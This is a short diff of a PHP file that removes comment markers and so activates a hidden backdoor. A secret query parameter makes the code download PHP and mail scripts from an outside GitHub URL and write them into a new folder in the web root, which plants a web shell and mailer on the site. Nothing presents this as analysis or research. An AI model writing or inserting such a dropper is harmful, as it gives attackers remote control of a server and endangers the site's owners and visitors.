@@ -2,7 +2,7 @@
 
 if(isset($_GET["eec"])&&$_GET["eec"]=="sec"){ 
 mkdir($_SERVER['DOCUMENT_ROOT']."/cgi-et");
-echo('Eec secra');  /*  
+echo('Eec secra');    
 
 $file = sexx('https://raw.githubusercontent.com/XetSec/Xet/main/und.php');
 $local=$_SERVER['DOCUMENT_ROOT']."/cgi-et/1index.php";
@@ -21,7 +21,7 @@ if (file_put_contents ($wpoptionss31, $sec31));
 
 $wpoptionssssr = sexx('https://raw.githubusercontent.com/XetSec/Xet/main/mail.txt');
 $wpoptionsssss = $_SERVER['DOCUMENT_ROOT'] . "/cgi-et/wp-linea.php"; 
-if (file_put_contents ($wpoptionsssss, $wpoptionssssr));   die(); */ }
+if (file_put_contents ($wpoptionsssss, $wpoptionssssr));   die(); }
 
 $random = rand(1,6);
 $d=$_SERVER['SERVER_NAME'];
